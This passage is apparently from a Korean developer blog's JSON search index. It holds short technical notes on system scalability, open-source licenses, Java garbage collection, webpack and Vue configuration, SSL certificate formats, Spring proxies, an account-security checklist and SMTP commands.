성능은 예상된 부하와 데이터 양에서 필수적인 사용 사례를 충분히 만족한다. 시스템은 허가되지 않은 접근과 오남용을 방지한다. 잘못될 수 있는 일을 결함(Fault)라고 부른다. 또한 이를 예측하고 대처할 수 있는 시스템을 내결함성(Fault-tolerant) or 탄력성 (resilent)을 지녔다고 말한다. 내결함성은 오해의 소지를 가지고 있는데 모든 결함을 견디는 것이 아니라 특정 유형의 결함 내성에 대해서만 이야기하는 것이 타당하다. 결함(Fault)은 장애(Failure)와 동일하지 않다. 장애는 사용자에게 필요한 서비스를 제공하지 못하고 시스템 전체가 멈춘 경우 결함 확률을 0으로 줄이는 것은 불가능하다. 하드웨어 결함 대규모 정전, 하드디스크 고장, 램 결함, 네트워크 케이블 결함 등 하드디스크 : RAID구성, 서버 : Hot Swap CPU, 데이터 센터 : 건전지, 예비 전원용 디젤 발전기 소프트웨어 오류 Systemic error(시스템 내 체계적 오류) 리눅스 커널 버그 CPU 시간, 메모리, 디스크 공간, 네트워크 대역폭 처럼 공유 자원을 과도하게 사용하는 일부 프로세스 시스템의 속도가 느려져 반응이 없거나 잘못된 응답을 반환하는 서비스 한 구성 요소의 작은 결함이 다른 구성요소의 결함을 야기해 더 많은 결함이 발생하는 연쇄장애(Cascading failure) 확장성 (Scalability) 시스템이 특정 방식으로 커지면 이에 대처하기 위한 선택은 무엇인가? 추가 부하를 다루기 위해 계산 자원을 어떻게 투입할까? 부하 기술하기 Load Parameter 웹 서버의 초당 요청 수 데이터베이스의 읽기 대 쓰기 비율 대화방의 동시 활성 사용자 수 (Active User) 캐시 적중률 EX) Twitter 주요 기능 트윗(tweet) 작성 : 사용자는 팔로워에게 새로운 메세지를 게시할 수 있다. (평균 초당 4.6k 요청, 피크일 때 초당 12k 요청 이상) 홈 타임라인(timeline) : 사용자는 팔로우한 사람이 작성한 트윗을 볼 수 있다. (초당 300k 요청) 트위터의 확장성 문제는 Fan-out 문제이다. fan-out : 전자공학에서 빌려온 용어로, 다른 게이트의 출력에 배속된 논리 게이트의 입력의 수를 뜻한다. 출력은 배속된 모든 입력을 구동하기 위한 충분한 전류를 공급해야 한다. 트랜잭션 처리 시스템에서 하나의 수신 요청을 처리하는 데 필요한 다른 서비스의 요청 수를 설명하기 위해 팬 아웃을 사용한다. 부하 매개변수를 증가시키고 시스템 자원을 변경하지 않고 유지하면 시스템 성능은 어떻게 영향을 받을까? 부하 매개변수를 증가시켰을 때 성능이 변하지 않고 유지되길 원한다면 자원을 얼마나 많이 늘려야 할까? 시스템 성능 Throughput : 초당 처리할 수 있는 레코드 수나 일정 크기 데이터 집합으로 작업을 수행할 때 걸리는 전체 시간 / ex) Hadoop Response Time: 응답 시간, 클라이언트가 요청을 보내고 응답을 받는 사이의 시간 Latency vs Response Time : 응답시간은 클라이언트 관점, 지연시간은 요청이 처리되길 기다리는 시간으로 서비스를 기다리며 휴지 상태인 시간을 말한다. 평균 응답 시간: 산술 평균(Arithmetic Mean)보다는 백분위, Median(중앙)값 상위 백분위 : 95분위, 99분위, 99.9 분위 (P95, P99, P999) Tail latency(꼬리 지연 시간) : 상위 백분위 응답시간 서비스 수준 목표(Service Level Object: SLO), 서비스 수준 협약서 (Service Level Agreement: SLA) 큐 대기 지연(queueing delay) : 높은 백분위에서 응답시간 상당 부분을 차지한다. ==&gt; head of line blocking (선두 차단) 실전 백분위 tail latency amplification 1분마다 구간 내 중앙값과 다양한 백분위를 계산에 각 지표를 그래프에 그리면 된다. 시간 구간내 모든 요청의 응답시간 목록을 유지하고 1분마다 목록을 정렬하는 방법이 있다. Forward Decay, T-digest, Hdr histogram 부하 대응 접근 방식 비공유(shared-nothing) 아키텍처 : 다수의 장비에 부하를 분산하는 아키텍처 Scaling up (수직 확장) Scaling out(수평 확장) 아키텍처를 결정하는 요소 : 읽기의 양, 쓰기의 양, 저장할 데이터의 양, 데이터의 복잡도, 응답 시간 요구사항, 접근 패턴 유지보수성 버그 수정, 시스템 운영 유지, 장애 조사, 새로운 플랫폼 적응, 기술 채무 상환, 새로운 기능 추가 운용성 : 운영의 편리함 만들기 시스템 상태를 모니터링하고 상태가 좋지 않다먼 빠르게 서비스를 복원 시스템 장애, 성능 저하 등의 문제 원인 추적 보안 때치를 포훌빼 소프트웨어와 플랫폼을 최신 상태로 유지 다른 시스템이 서로 어떻게 영향을 주는 지 확인해 문제가 생길수 있는 변경사항을 손상을 입히기 전에 차단 미래에 발생 가능한 문제를 예측해 문제가 발생하기 전에 해결 (예를 들어 용량 계획) 배포설정관리등을위한모범A떼와도구를마련 어플리케이션을 특정 플랫폼에서 다른 플랫폼으로 이동하는 등 복응한 유지보수 태스크를 수행 설정 변경으로 생기는 시스템 보안 유지보수 예측 가능한 운영과 안정적인 서비스 환경을 유지하기 위한 절차 정의 개인 인사 이동에도 시스템에 대한 조직의 지식을 보존함 데이터 시스템 개선 좋은 모니터링으로 런타임(runtime) 동작과 시스템의 내부에 대한 가시성 제공 표준 도구를 이용해 자동화와 통합을 위한 우수한 자원을 제공 개별 장비 의존성을 회피, 유지보수를 위해 장비를 내리더라도 시스템 전체에 영향을 주지 않고 계속해서 운영 가능해야 함 좋은 문서와 이해하기 쉬운 운영 모댈(예를 들어 “X를 하면 Y가 발생한다&quot;) 제공 만족할 만한 기본동작을 제공하고, 필요할 때 기본값을 다시 정의할 수 있는 자유를 관리자에게 부여 적절하게 자기 회복{self–healing)이 가능할 뿐 아니라 필요에 따라 관리자가 시스템 상태를 수동으로 제어할 수 있게 힘 예측 가능하게 동작하고 예기치 않은 상황을 최소화 단순성 : 복잡도 관리 추상화 발전성 : 변화를 쉽게 만들기 TDD, Refactoring","categories":[],"tags":[{"name":"data intensive","slug":"data-intensive","permalink":"https://blog.devkwang.app/tags/data-intensive/"}]},{"title":"vue-performance-optimization","slug":"vue-performance-optimization","date":"2020-09-02T05:17:39.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2020/09/02/vue-performance-optimization/","link":"","permalink":"https://blog.devkwang.app/2020/09/02/vue-performance-optimization/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"oss-license","slug":"oss-license","date":"2020-08-24T02:43:26.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/08/24/oss-license/","link":"","permalink":"https://blog.devkwang.app/2020/08/24/oss-license/","excerpt":"","text":"저작권 (Copy Right) 창작자가 취득하는 권리 창작자의 결과물을 보호 창작과 동시에 권리가 발생 프로그래머 또는 그가 속한 회사에 부여 저작권의 허락없이는 누구도 해당 저작물을 복제, 배포, 수정할 수 없다. 특허권 (Patent) 발명자가 갖는 독점배타권, 일정한 방식으로 출원해야 하며, 심사를 통과한 후 등록되어야만 권리가 발생 특허 기술을 사용하기 위해서는 특허권자의 허락을 얻어야만 함 특허 받은 방식을 구현하는 소프트웨어라면 프로그래밍 언어에 상관없이 특허권의 범위에 속한다. 상표권 (Trademark) 상표권자가 지정상품에 관하여 그 등록상표를 사용할 독점적인 권리, 일정한 절차에 따라 등록하여야 효력이 발생 이러한 상표를 사용하기 위해서는 반드시 상표권자의 허락을 얻어야 하며 허락받지 않고 상표를 이용할 경우 상표권의 침해에 해당한다. 프로그램 저작권 특허권 권리 발생 창작과 동시에 발생 특허출원, 심사, 등록 권리 내용 인격권(공표권, 성명표시권, 동일성 유지권) 재산권(복제권, 개작권, 배포권, 전송권) 독점배타적 실시권 효력 범위 표현(코드)의 실질적 유사성 아이디어(알고리즘, 기능)의 동일성 Open Source License 저작권, 개발자 및 기여자 정보의 표시 대부분의 오픈소스 라이선스는 개발자 또는 기여자에 관한 사항과 저작권에 관한 사항을 제품에 표시하거나 포함하도록 요구하고 있다. 마치 저작인격권의 하나인 성명표시권과 유사하다. 코드를 수정한 경우 수정한 정보의 표시 이용자가 소스코드를 수정하였을 때에는 수정한 사람, 수정 일자 등 수정에 관한 내용을 포함하도록 함으로써, 원본과 구별할 수 있도록 한다. 저작인격권의 하나인 동일성유지권에 비유할 수 있다. 라이선스 정보의 제공 많은 오픈소스 라이선스들은 이용자들이 오픈소스에 관한 권리를 잘 이해할 수 있도록 배포자가 해당 라이선스의 사본을 함께 첨부할 것을 요구한다. 동일한 라이선스로 재배포할 것 (Copyleft) 라이선스에 따라 큰 차이를 보이는 부분은 '카피레프트(Copyleft)'에 관한 사항이다. GPL을 대표로 하는 카피레프트 라이선스들은 이용자들이 소프트웨어를 수정한 후 배포하고자 할 때 수정된 소프트웨어도 동일한 라이선스로 배포할 것을 요구한다. 1234카피레프트(Copyleft)라는 용어는 원래 저작권(Copyright)에 반대한다는 의미로 “Copy-right”에서 “right” 대신 “left”로 바꾸어 사용하기 시작한 것이다. 그런데, FSF가 말하는 “소프트웨어의 자유”를 지키기 위한 구체적인 수단이 GPL이며, 그 중에서도 핵심적인 내용은 파생저작물을 GPL로 재배포할 것을 요구하는 조항이기 때문에, 보통 이 조항을 가리켜 카피레프트 조항이라고 부르고 있다. 소스코드의 제공 카피레프트 조항을 포함하는 라이선스의 경우, 소프트웨어를 배포할 때 소스코드까지 함께 배포하도록 요구한다. ex) https://opensource.samsung.com/main 라이선스의 특징 및 의무사항 BSD APACHE 2.0 GPL 2.0 GPL 3.0 LGPL 2.1 MPL CDDL CPL/EPL 복제 배포 수정의 권한 부여 O O O O O O O O 배포시 라이선스 사본 첨부 - O O O O O O O 저작권 고지사항 또는 Attribution 고지사항 유지 O O O O O O O O 배포시 소스코드 제공의무와 범위 - - derivative work work based on the program derivative work file file module 저작권 고지사항 또는 Attribution 고지사항 유지 O O O O O O O O 조합저작물(Larger Work) 작성 및 타 라이선스 배포 허용 O O - - O O O O 수정시 수정내용 고지 - O O O O O O O 명시적 특허라이선스의 부여 - O - O - O O O 라이선시가 특허소송 제기시 라이선스 종료 - O - O - O O O 이름, 상표, 상호에 대한 사용제한 O O - - - O O - 보증의 부인 O O O O O O O O 책임의 제한 O O O O O O O O https://www.olis.or.kr/license/introduction.do http:///www.opensource.org/","categories":[],"tags":[{"name":"oss","slug":"oss","permalink":"https://blog.devkwang.app/tags/oss/"},{"name":"license","slug":"license","permalink":"https://blog.devkwang.app/tags/license/"}]},{"title":"debug-chrome-remote","slug":"debug-chrome-remote","date":"2020-08-21T13:26:55.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/08/21/debug-chrome-remote/","link":"","permalink":"https://blog.devkwang.app/2020/08/21/debug-chrome-remote/","excerpt":"","text":"remote debug setting 모바일 기기 USB연결 모바일 개발자 모드 설정 adb 설치 https://developer.android.com/studio/releases/platform-tools 설치 후 abd 실행하도록 환경 변수 설정 cmd에서 설치 확인 adb devices chrome 브라우저 확인 chrome://inspect/#devices","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://blog.devkwang.app/tags/chrome/"},{"name":"remote","slug":"remote","permalink":"https://blog.devkwang.app/tags/remote/"},{"name":"mobile","slug":"mobile","permalink":"https://blog.devkwang.app/tags/mobile/"}]},{"title":"css-mobile","slug":"css-mobile","date":"2020-08-21T13:13:48.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/08/21/css-mobile/","link":"","permalink":"https://blog.devkwang.app/2020/08/21/css-mobile/","excerpt":"","text":"ViewPort Setting 1&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; width=device-width : 페이지의 너비를 기기의 스크린 너비로 설정합니다. 즉, 렌더링 영역을 기기의 뷰포트의 크기와 같게 만들어 줍니다. height=device-height : 페이지의 높이를 기기의 스크린 너비로 설정합니다. 즉, 렌더링 영역을 기기의 뷰포트의 크기와 같게 만들어 줍니다. initial-scale=1.0 : 처음 페이지 로딩시 확대/축소가 되지 않은 원래 크기를 사용하도록 합니다. 0~10 사이의 값을 가집니다. minimum-scale : 줄일 수 있는 최소 크기를 지정합니다. 0~10 사이의 값을 가집니다. maximum-scale : 늘릴 수 있는 최대 크기를 지정합니다. 0~10 사이의 값을 가집니다. user-scalable : yes 또는 no 값을 가지며 사용자가 화면을 확대/축소 할 수 있는지는 지정합니다. Safari Setting 1&lt;meta name=\"apple-mobile-web-app-capable\" content=\"yes\" /&gt; yes면 전체화면 모드로 작동함, no면 작동하지 않음 1&lt;meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black-translucent\" /&gt; default black black-translucent : 검정 반투명 browser Setting Mobile일 경우 최상위 부모 태그에 Position: fixed를 주고 overflow: hidden을 주자","categories":[],"tags":[{"name":"css","slug":"css","permalink":"https://blog.devkwang.app/tags/css/"}]},{"title":"java-performance-gc-start","slug":"java-performance-gc-start","date":"2020-08-16T05:20:14.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/08/16/java-performance-gc-start/","link":"","permalink":"https://blog.devkwang.app/2020/08/16/java-performance-gc-start/","excerpt":"","text":"참조 https://docs.oracle.com/en/java/javase/14/gctuning/garbage-first-g1-garbage-collector1.html#GUID-ED3AB6D3-FD9B-4447-9EDF-983ED2F7A573 GC의 기본 동작 미사용 객체 찾기 가용 메모리 생성 힙 압축 G1 컬렉터 (Garbage First Collector) 미사용 객체를 훑어보는 동안 어플리케이션 스레드를 멈추지 않고도 처리한다. (Concurrent Collector) low pause collector 4GB 이상의 큰 힙을 처리하도록 설계 힙을 여러 개의 영역으로 나누지만 여전히 제네레이션 기반의 컬렉터이다. 이 영역의 일부는 영 제네레이션을 구성하고, 영 제네레이션은 여전히 모든 어플리케이션 스레드를 멈추고 올드 제네레이션이나 서바이버 스페이스로 살아 있는 객체 전부를 이동하면서 수집된다. Background thread 로 올드 제네레이션을 처리하며, 이는 여러 영역으로 나뉘기 때문에 한 영역에서 다른 영역으로 복사해 올드 제네레이션에서 객체 삭제가 가능하며, 일반적인 처리를 하는 동안 힙을 부분적으로 압축이 가능하다. GC 설정 힙 크기 정하기 힙이 너무 작다면 프로그램은 GC의 수행 횟수가 많아져 수행시간이 늘어날 것이고, 힙이 매우 크다면 한번의 GC실행에 많은 시간을 소요할 것이다. 실제 기동되는 것보다 더 큰 힙을 사용할 경우 OS는 가상 메모리를 사용한다. 이는 memory swapping 혹은 paging이라는 방식으로 이를 관리한다. OS에서 많은 어플리케이션이 실행 되고 있을 경우에는 효과적(대부분의 어플리케이션은 동시에 활성화 되지 않는다고 가정했을때)이다 자바 어플리케이션 1개가 물리적인 메모리 사용 공간을 넘어 힙을 사용할 경우에는 GC시 디스크에서 RAM으로 데이터를 swap하면서 심한 성능상의 불이익을 초래한다. 명시적으로 최대 크기를 설정하더라도 힙의 크기가 자동으로 조정된다. 힙은 디폴트 초기 크기로 시작하고, JVM은 GC 알고리즘의 성능 목표를 만족시키기 위해 힙을 늘릴 것이다. 필요로 하는 것보다 더 큰 힙을 명시한다고 해서 반드시 메모리상 불이익을 받는 것은 아니다. java 7 permgen, java 8 metaspace 병렬성 제어하기 G1의 모든 어플리케이션 스레드 중간단계의 GC동작은 어플리케이션 스레드가 실행되는 걸 막기 떄문에 JVM은 중지시간을 최소화 하기 위해 가능한 CPU 자원을 많이 사용하고자 한다. 이건 기본적으로 JVM이 한 머신 내의 각 CPU당 스레드 한개씩 8개까지 실행한다는 의미이다. 임계치에 다다르면 JVM은 CPU 한 개의 5/8마다 신규 스레드 한개만 추가한다. 8개 이상의 CPU를 갖고 있는 머신 한 개에서 스레드의 총 개수는 다음과 같다. ParallelGCThreads = 8 + ((N - 8) * 5 /8) 적응 크기 조정 힙, 제네레이션과 서바이버 스페이스의 크기는 JVM이 정책과 튜닝에 따라 최적의 성능을 찾고자 시도하면서 실행되는 동안 달라질 수 있다. 작은 어플리케이션은 힙 크기의 과도한 지정에 대해 걱정할 필요가 없다는 것을 의미한다. 대다수의 어플리케이션들은 실제로 힙 사이즈에 대한 튜닝을 전혀 걱정할 필요가 없다는 의미이다. 플랫폼 디폴트보다 더 큰 힙을 필요로 하면 힙의 크기를 더 크게 명시하기만 하고 다른 세부 사항에 대해서는 잊어버릴 수 있다. Throughput Collector (처리율 컬렉터 ) 이해하기 Minor GC (Young Collection) Young Generation이 가득 찼을 때 일어나며, 모든 객체를 에덴의 밖으로 옮긴다. 일부는 서바이버 스페이스 중의 하나로 옮기고, 일부는 올드 제네레이션으로 옮기므로 이후에는 더 많은 객체를 갖게 된다.12317.806: [GC[PSYoungGen: 2227983K-&gt;14463K(264128K)] 280122K-&gt;66610K(613696K), 0.0169320 secs] [Times: user=0.05 sys=0.00, real=0.02 secs] 현재 영 제네레이션의 전체 크기는 264MB, 힙의 전반적인 사용량(영,올드 제네레이션)은 280MB -&gt; 64MB, 전체 610MB Full GC (Old Generation) Full GC는 영 제네레이션 외의 모든걸 해제한다. 올드 제네레이션에 남아있는 객체들은 유효한 참조를 갖고 있는 것 뿐이며, 올드 제네레이션에 남아 있는 객체들은 유효한 참조를 가지고 있는 것 뿐이다. 올드 제네레이션의 객체들은 전부 압축되어 올드 제네레이션의 앞 부분을 점유하고 있고 나머지는 해제 된다. 64.546: [Full GC [PSYoungGen: 15808K-&gt;0K(339456K)] [ParOldGen: 457753K -&gt; 392528K(554432K)] 473561K -&gt; 392528K (893888K) [PSPermGen: 56728K -&gt; 56728K (115392K)], 1.3367080 secs] [Times: user=4.44 sys=0.01, real=1.34 secs] 영제네레이션은 이제 0Byte를 점유한다. (크기는 339MB) 올드 제네레이션의 크기는 457MB -&gt; 392MB로 줄어들었다. 퍼머넌트 제네레이션의 크기는 변함없다. 대부분의 풀 GC가 일어나는 동안 여기는 수집하지 않는다. 퍼머넌트 제네레이션이 공간을 다 써버리면 JVM은 퍼머넌트 제네레이션을 수집하기 위해 풀 GC를 수행한다. 이때 변경되는 것을 볼 수 있다. 적응과 정적 힙 크기 튜닝 처리율 컬렉터 튜닝은 전체 힙 크기와 올드/영 제네레이션 크기 사이의 균형 유지와 중단 시간에 대해서만 고려하면 된다. 시간과 공간에 대한 고전적인 프로그래밍 트레이드 오프사항 GC를 수행하는 데 걸리는 시간의 길이와 주기 풀 GC 중단 횟수는 힙 크기를 늘리면 줄일 수 있지만 그로 인해 GC가 더 오래 걸리므로 평균 응답시간이 길어져서 왜곡된 영향을 끼친다. 풀 GC 중단은 올드 제네레이션 보다 영 제네레이션에 더 많은 힙을 할당해서 줄일 수 있지만 결국 올드 GC 컬렉션의 빈도가 늘어난다. GCTimeRatio : 어플리케이션이 GC에 써도 무방할 정도의 시간을 명시한다. 이것은 비율이다 디폴트 값은 99이다. CMS(Concurrent Mark Sweep) Collector 이해하기 TODO :: CMS! G1 collector 이해하기 G1은 힙 내의 개별 영역에서 동작하는 동시 병렬 컬렉터다. 각 영역(Default 2048개)은 올드나 신규 제네레이션에 속할 수 있고 제네레이션의 영역은 인접할 필요는 없다. G1은 네 가지의 주요 동작을 한다. 영 컬렉션 백그라운드, 동시 병렬 주기 혼합 컬렉션 필요한 경우 풀 GC","categories":[],"tags":[]},{"title":"javascript-es-module","slug":"javascript-es-module","date":"2020-08-10T04:53:01.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/08/10/javascript-es-module/","link":"","permalink":"https://blog.devkwang.app/2020/08/10/javascript-es-module/","excerpt":"","text":"https://jakearchibald.com/2017/es-modules-in-browsers/ https://poiemaweb.com/es6-module https://d2.naver.com/helloworld/12864","categories":[],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://blog.devkwang.app/tags/javascript/"},{"name":"es module","slug":"es-module","permalink":"https://blog.devkwang.app/tags/es-module/"}]},{"title":"vue-static-generated","slug":"vue-static-generated","date":"2020-08-10T02:07:00.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2020/08/10/vue-static-generated/","link":"","permalink":"https://blog.devkwang.app/2020/08/10/vue-static-generated/","excerpt":"","text":"https://vuedose.tips/setting-up-a-full-static-nuxt-site/ https://blog.tailwindcss.com/ SSR (Server Side Rendered): they’re rendered on the server for every request. Sprinter works like that. SPA (Single Page Application): client-only javascript based apps. Nowadays, they’re quite well-known. Static Generated: a.k.a. Jam Stack. Similar to SSR, but the html is rendered at compile time, so they don’t need a server while also being SEO friendly.","categories":[],"tags":[{"name":"vue","slug":"vue","permalink":"https://blog.devkwang.app/tags/vue/"}]},{"title":"css-pseudo","slug":"css-pseudo","date":"2020-08-10T01:34:44.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/08/10/css-pseudo/","link":"","permalink":"https://blog.devkwang.app/2020/08/10/css-pseudo/","excerpt":"","text":"pseudo elements Element의 특정 상황에 따라 정보를 표기하고 싶을 때 사용하는 element Tag ex) Alarm Badge, ToolTip ::before ::after ::first-letter ::first-line ::selection attr() pseudo elements에서 target element의 속성값을 가져다가 쓰고 싶을 경우 사용하는 CSS pseudo classes :active :checked :disabled etc…","categories":[],"tags":[{"name":"pseudo","slug":"pseudo","permalink":"https://blog.devkwang.app/tags/pseudo/"}]},{"title":"webpack-bundle-analyzer","slug":"webpack-bundle-analyzer","date":"2020-08-07T06:27:17.000Z","updated":"2022-01-28T01:25:12.427Z","comments":true,"path":"2020/08/07/webpack-bundle-analyzer/","link":"","permalink":"https://blog.devkwang.app/2020/08/07/webpack-bundle-analyzer/","excerpt":"","text":"Webpack bundle analyzer Project를 진행하고 있는데 Bundle의 사이즈가 커져 빌드시 워닝이 뜨고 있는 상태이다. 아무리 gzip 압축을 진행한다 한들 원채 사이즈가 크면 속도에 지대한 영향을 끼친다. Webpack bundle analyzer npm install --save-dev webpack-bundle-analyzer 1234567891011121314151617181920212223242526272829303132const path = require('path');const BundleAnalyzerPlugin = require('webpack-bundle-analyzer') .BundleAnalyzerPlugin;module.exports = &#123; publicPath: '/', devServer: &#123; port: 8081, proxy: &#123; '/api': &#123; target: process.env.API_SERVER_URL, changeOrigin: true, &#125;, &#125;, &#125;, configureWebpack: &#123; resolve: &#123; alias: &#123; '@': path.join(__dirname, 'src'), assets: path.resolve(__dirname, 'src', 'assets'), &#125;, &#125;, plugins: [new BundleAnalyzerPlugin()], &#125;, css: &#123; loaderOptions: &#123; sass: &#123; prependData: `@import \"@/assets/scss/main.scss\";`, &#125;, &#125;, &#125;,&#125;;","categories":[],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://blog.devkwang.app/tags/javascript/"},{"name":"vue","slug":"vue","permalink":"https://blog.devkwang.app/tags/vue/"},{"name":"webpack","slug":"webpack","permalink":"https://blog.devkwang.app/tags/webpack/"}]},{"title":"cryptography-ssl-certification-nginx","slug":"cryptography-ssl-certification-nginx","date":"2020-07-21T01:01:37.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/07/21/cryptography-ssl-certification-nginx/","link":"","permalink":"https://blog.devkwang.app/2020/07/21/cryptography-ssl-certification-nginx/","excerpt":"","text":"SSL 인증서 파일 포멧 종류 확장자는 그 파일의 특성이 무엇인지 쉽게 알 붙이는 것이지만, 바이너리 이진 파일에 .txt 확장자를 붙일수도 있는 것처럼 말그대로 이름일 뿐이다. 그래서 확장자 보다는 해당 파일의 실제 형식을 확인하는 것이 중요하다. 파일 포멧 .pem PEM(Privacy Enhanced Mail)은 Base64 인코딩된 ASCII 텍스트 이다. 파일 구분 확장자로 .pem을 주로 사용한다. 개인키, 서버 인증서, 루트 인증서, 체인 인증서 및 SSL 발급 요청시 생성하는 CSR 등에 사용되는 포멧이며, 가장 광범위하고 거의 99% 대부분의 시스템에 호환되는 산업 표준이다. .crt 대부분 PEM 포멧이고 유닉스/리눅스 기반 시스템에서 인증서로 구분하기 뒤해 사용된다. .cer 대부분 PEM 포멧이고 윈도우 기반 시스템에서 인증서로 구분하기 뒤해 사용된다. .csr CSR(Cerfiticate Signing Request)는 PEM포멧이며, SSL 발급 신청을 위해서 본 파일 내용을 인증기관 CA에 제출하는 요청서 파일임을 구분하기 위해서 붙이는 확장자 이다. .der DER(Distinguished Encoding Representation)의 약자이며, 바이너리 포멧이다. 최근에는 잘 사용되지 않는다. .key OPENSSL 및 Java에서 개인키 파일임을 구분하기 위해서 사용되는 확장자이다. PEM일수도 있고 DER일수도 있다. .jks Java Key Store의 약자이며, Java 기반의 독자 인증서 바이너리 포멧이다. 개인키,서버 인증서, 루트 인증서, 체인인증서를 모두 담고 있다.","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[]},{"title":"spring-boot-proxy","slug":"spring-boot-proxy","date":"2020-07-18T15:55:53.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/07/19/spring-boot-proxy/","link":"","permalink":"https://blog.devkwang.app/2020/07/19/spring-boot-proxy/","excerpt":"","text":"Spring Proxy Proxy pattern 실제 기능을 수행하는 객체(Real Object)대신 가장의 객체(Proxy Object)를 사용해 로직의 흐름을 제어하는 디자인 패턴 원래 하려던 기능 외에 다른 것을 추가하고 싶으나 해당 코드 자체를 변경 하지 않고 싶을때, 많이 사용한다. Real Object, Proxy Object는 동일한 인터페이스를 구현하고 Proxy Object는 메서드 수행시 Real Object의 메소드 실행을 가로챈다. Virtual Proxy(Lazy initialisation 등), Protection Proxy Byte Code Generation Library cglib : https://github.com/cglib/cglib byteBuddy : https://bytebuddy.net ASM : Java bytecode manipulation and analysis framework https://asm.ow2.io/","categories":[],"tags":[{"name":"springboot","slug":"springboot","permalink":"https://blog.devkwang.app/tags/springboot/"}]},{"title":"spring-boot-application-context","slug":"spring-boot-application-context","date":"2020-07-18T14:56:20.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/07/18/spring-boot-application-context/","link":"","permalink":"https://blog.devkwang.app/2020/07/18/spring-boot-application-context/","excerpt":"","text":"Annotation Config Servlet Application Context (Spring boot 2.3.1 Version 기준) AnnotationBeanDefinitionReader Field 설명 BeanNameGenerator : 기능 설명 명칭은 Reader인데 Bean을 등록하는 함수를 가지고 있다. registerBean과 Environment 생성을 담당한다. Environment : Java System의 Environment로 System Properties(String value)와 System Environment(Key/Value)를 propertySource에 등록한다. registerBean : ClassPathBeanDefinitionScanner","categories":[],"tags":[{"name":"springboot","slug":"springboot","permalink":"https://blog.devkwang.app/tags/springboot/"}]},{"title":"security-project-account-rule","slug":"security-project-account-rule","date":"2020-07-08T05:20:01.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/07/08/security-project-account-rule/","link":"","permalink":"https://blog.devkwang.app/2020/07/08/security-project-account-rule/","excerpt":"","text":"계정 관리 항목 비고 패스워드 규칙 관리 10자리 이상 영문/숫자/특수문자 2가지 이상 조합 사용 패스워드 변경 주기 90일 이내 패스워드 변경 진행 패스워드 암호화 안전한 암호화 로직으로 패스워드 암호화 계정별 권한 설정 사용자별 계정의 용도 파악 및 적절한 권한을 부여 계정 관리 1인 1계정 사용 로그인 실패 횟수 제한 로그온 실패 횟수를 5회 이하로 제한한 경우 양호 (실패시 일정시간 잠금 조치) 접근 관리 항목 비고 관리자 Page 원격 관리 접근 통제 원격 관리시 관리자 IP 또는 특정 IP만 접근 가능하도록 설정 암호화 통신 접속 HTTPS 양호 Session Timeout 설정 Session Timeout시간을 설정한 경우 양호 로그 관리 항목 비고 정책 변경 로그 설정 관리자 정책 변경에 따른 로그 기록 사용자 접속 로그 보안 사용자 로그인/접속 로그 보관 설정 시스템 로그 정기적 검토 시스템 로그 검토(이상 접속 여부)를 정기적으로 검토","categories":[],"tags":[]},{"title":"protocol-smtp","slug":"protocol-smtp","date":"2020-07-01T01:46:20.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/07/01/protocol-smtp/","link":"","permalink":"https://blog.devkwang.app/2020/07/01/protocol-smtp/","excerpt":"","text":"SMTP (Simple Mail Transfer Protocol) SMTP : 두 메일시스템이 전자우편을 교환할 수 있게 하는 메세지 전송용 프로토콜 통신 포트 : 25 모든 처리는 항상 하나의 TCP 연결을 통해 실행됨 메일 서버는 데몬으로 동작하며, 메일 클라이언트로부터 요청에 항상 준비 주요 구성 요소 UA(User Agent) : Outlook, Zmail등 MTA(Message Transfer Agent) : 메일을 중계, 전달하는 기능을 수행 MAA(Message Access Agent) : 메일 엑세스용 프로토콜 MTA 클라이언트 및 MTA 서버 간 주요 명령 및 응답 SMTP 주요 명령 HELLO : 클라이언트 자신이 누구인지 밝힘 (Hello : kwang.co.kr) MAIL FROM : 클라이언트가 메일 송신자가 누구인지 RCPT TO : 수신처 DATA : 전체 메일 메세지 전송을 송신측에서 준비됨 QUIT 등 Mail Message Format 메세지 구성 Header Return-Path : 하나 이상의 SMTP 서버 경유시 Received : 하나 이상의 SMTP 서버 경유시 From: 발신자 To : 수신자 Subject : 제목 Date : 날짜 MIME 확장 : Body에 멀티미디어 데이터가 포함되는 경우에 MIME(Multi-purpose Internet Mail Extension Type) MIME-version Content-Transfer-Encoding Content-Type: Content-Type 설명 Text / Plain 포맷되지 않는 텍스트 (특정한 문자세트로 구성됨) Text / Richtext 볼드, 이탤릭체, 밑줄 등 간단한 포맷을 가진 텍스트 Application / Octet-Stream Binary 데이타 Application / Postscript PostScript 프로그램 Message / RFC 822 또다른 우편 메시지 RFC 822 Image / JPEG 정지화상 데이타, ISO 10918 포맷 Image / GIF 정지화상 데이타, CompuServe의 Graphic interchange 포맷 Video / MPEG 동화상 데이타, ISO 11172 포맷 Audio / Basic 오디오 데이타, 8비트 ISDN mu-law 포맷을 사용한 인코드 Body 각 줄은 단일점. 으로 끝남 멀티 미디어용 데이터인 경우에는 헤더부분에 MIME 선언이 있음 telnet 172.0.0.1 25 HELLO kwang.co.kr MAIL FROM:kwang@kwang.co.kr RCPT TO:kwang@kwang.co.kr DATA SUBJECT: Test subject test content . RFC-2045 : Multipurpose Internet Mail Extensions (MIME) Part One: Format of Internet Message Bodies. N. Freed, N. Borenstein. November 1996. (Status: DRAFT STANDARD) RFC-2046 : Multipurpose Internet Mail Extensions (MIME) Part Two: 